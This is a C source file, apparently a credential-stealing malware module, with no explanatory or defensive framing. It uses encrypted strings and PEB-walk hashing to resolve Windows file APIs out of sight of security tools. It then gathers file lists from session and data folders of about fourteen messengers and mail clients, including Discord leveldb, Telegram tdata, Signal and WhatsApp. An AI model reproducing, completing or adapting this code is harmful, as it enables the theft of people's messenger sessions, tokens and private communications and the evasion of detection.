#ifdef TEST_MESSENGERS_STANDALONE
/* Standalone test mode: expose path construction helpers only, no Windows deps */
#include "messengers.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void messenger_get_path(char *buf, size_t bufsz, const char *appdata,
                        const char *subdir) {
    snprintf(buf, bufsz, "%s\\%s", appdata, subdir);
}

#else /* Normal build */

#include "messengers.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

/* PEB-walk API resolution for kernel32 file APIs */
typedef HANDLE (WINAPI *pFindFirstFileA)(const char *, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *pFindNextFileA)(HANDLE, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *pFindClose)(HANDLE);

static struct {
    pFindFirstFileA pFF;
    pFindNextFileA  pFN;
    pFindClose      pFC;
    int             ready;
} ms_api;

static int ms_ensure_api(void) {
    if (ms_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    ms_api.pFF = (pFindFirstFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    ms_api.pFN = (pFindNextFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    ms_api.pFC = (pFindClose)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!ms_api.pFF || !ms_api.pFN || !ms_api.pFC) return 0;
    ms_api.ready = 1;
    return 1;
}

// Helper: collect files from a directory
static MessengerResult collect_dir_files(const char *dir_path) {
    if (!ms_ensure_api()) { MessengerResult r = {0}; return r; }
    MessengerResult result = {0};
    
    WIN32_FIND_DATAA findData;
    char search_path[1024];
    snprintf(search_path, sizeof(search_path), "%s\\*", dir_path);
    
    HANDLE hFind = ms_api.pFF(search_path, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return result;
    
    size_t count = 0;
    char **files = NULL;
    
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir_path, findData.cFileName);
        
        char **new_files = realloc(files, (count + 1) * sizeof(char *));
        if (!new_files) break;
        files = new_files;
        files[count] = mi_strdup(full_path);
        count++;
    } while (ms_api.pFN(hFind, &findData));
    
    ms_api.pFC(hFind);
    
    result.files = files;
    result.count = count;
    return result;
}

#ifdef ENABLE_DISCORD
// Discord: %APPDATA%\Discord\Local Storage\leveldb
static MessengerResult collect_discord(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Discord\\Local Storage\\leveldb", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Discord");
    return r;
}
#endif

#ifdef ENABLE_TELEGRAM
// Telegram: %APPDATA%\Telegram Desktop\tdata
static MessengerResult collect_telegram(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Telegram Desktop\\tdata", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Telegram");
    return r;
}
#endif

#ifdef ENABLE_SIGNAL
// Signal: %APPDATA%\Signal
static MessengerResult collect_signal(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Signal", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Signal");
    return r;
}
#endif

#ifdef ENABLE_WHATSAPP
// WhatsApp: %APPDATA%\WhatsApp
static MessengerResult collect_whatsapp(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\WhatsApp", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("WhatsApp");
    return r;
}
#endif

#ifdef ENABLE_SKYPE
// Skype: %APPDATA%\Skype
static MessengerResult collect_skype(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Skype", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Skype");
    return r;
}
#endif

#ifdef ENABLE_VIBER
// Viber: %APPDATA%\ViberPC
static MessengerResult collect_viber(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\ViberPC", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Viber");
    return r;
}
#endif

#ifdef ENABLE_ELEMENT
// Element: %APPDATA%\Element
static MessengerResult collect_element(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Element", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Element");
    return r;
}
#endif

#ifdef ENABLE_SESSION
// Session: %APPDATA%\Session
static MessengerResult collect_session(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Session", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Session");
    return r;
}
#endif

#ifdef ENABLE_TOX
// Tox: %APPDATA%\tox
static MessengerResult collect_tox(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\tox", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Tox");
    return r;
}
#endif

#ifdef ENABLE_ICQ
// ICQ: %APPDATA%\ICQ
static MessengerResult collect_icq(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\ICQ", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("ICQ");
    return r;
}
#endif

#ifdef ENABLE_PIDGIN
// Pidgin: %APPDATA%\.purple
static MessengerResult collect_pidgin(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\.purple", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Pidgin");
    return r;
}
#endif

#ifdef ENABLE_JABBER
// Jabber: %APPDATA%\Psi
static MessengerResult collect_jabber(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Psi", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Jabber");
    return r;
}
#endif

#ifdef ENABLE_OUTLOOK
// Outlook: %APPDATA%\Microsoft\Outlook
static MessengerResult collect_outlook(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\Microsoft\\Outlook", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("Outlook");
    return r;
}
#endif

#ifdef ENABLE_MICROSIP
// MicroSIP: %APPDATA%\MicroSIP
static MessengerResult collect_microsip(const char *roaming) {
    char path[1024];
    snprintf(path, sizeof(path), "%s\\MicroSIP", roaming);
    MessengerResult r = collect_dir_files(path);
    r.name = mi_strdup("MicroSIP");
    return r;
}
#endif

MessengerData collect_messengers(const char *roaming_app_data, const char *local_app_data) {
    MessengerData data = {0};
    
#ifdef ENABLE_DISCORD
    data.discord = collect_discord(roaming_app_data);
#endif
#ifdef ENABLE_TELEGRAM
    data.telegram = collect_telegram(roaming_app_data);
#endif
#ifdef ENABLE_SIGNAL
    data.signal = collect_signal(roaming_app_data);
#endif
#ifdef ENABLE_WHATSAPP
    data.whatsapp = collect_whatsapp(roaming_app_data);
#endif
#ifdef ENABLE_SKYPE
    data.skype = collect_skype(roaming_app_data);
#endif
#ifdef ENABLE_VIBER
    data.viber = collect_viber(roaming_app_data);
#endif
#ifdef ENABLE_ELEMENT
    data.element = collect_element(roaming_app_data);
#endif
#ifdef ENABLE_SESSION
    data.session = collect_session(roaming_app_data);
#endif
#ifdef ENABLE_TOX
    data.tox = collect_tox(roaming_app_data);
#endif
#ifdef ENABLE_ICQ
    data.icq = collect_icq(roaming_app_data);
#endif
#ifdef ENABLE_PIDGIN
    data.pidgin = collect_pidgin(roaming_app_data);
#endif
#ifdef ENABLE_JABBER
    data.jabber = collect_jabber(roaming_app_data);
#endif
#ifdef ENABLE_OUTLOOK
    data.outlook = collect_outlook(roaming_app_data);
#endif
#ifdef ENABLE_MICROSIP
    data.microsip = collect_microsip(roaming_app_data);
#endif
    
    return data;
}

void free_messenger_result(MessengerResult *r) {
    if (r->files) {
        for (size_t i = 0; i < r->count; i++)
            free(r->files[i]);
        free(r->files);
    }
    free(r->name);
}

void free_messenger_data(MessengerData *data) {
#ifdef ENABLE_DISCORD
    free_messenger_result(&data->discord);
#endif
#ifdef ENABLE_TELEGRAM
    free_messenger_result(&data->telegram);
#endif
#ifdef ENABLE_SIGNAL
    free_messenger_result(&data->signal);
#endif
#ifdef ENABLE_WHATSAPP
    free_messenger_result(&data->whatsapp);
#endif
#ifdef ENABLE_SKYPE
    free_messenger_result(&data->skype);
#endif
#ifdef ENABLE_VIBER
    free_messenger_result(&data->viber);
#endif
#ifdef ENABLE_ELEMENT
    free_messenger_result(&data->element);
#endif
#ifdef ENABLE_SESSION
    free_messenger_result(&data->session);
#endif
#ifdef ENABLE_TOX
    free_messenger_result(&data->tox);
#endif
#ifdef ENABLE_ICQ
    free_messenger_result(&data->icq);
#endif
#ifdef ENABLE_PIDGIN
    free_messenger_result(&data->pidgin);
#endif
#ifdef ENABLE_JABBER
    free_messenger_result(&data->jabber);
#endif
#ifdef ENABLE_OUTLOOK
    free_messenger_result(&data->outlook);
#endif
#ifdef ENABLE_MICROSIP
    free_messenger_result(&data->microsip);
#endif
}

#endif /* TEST_MESSENGERS_STANDALONE */
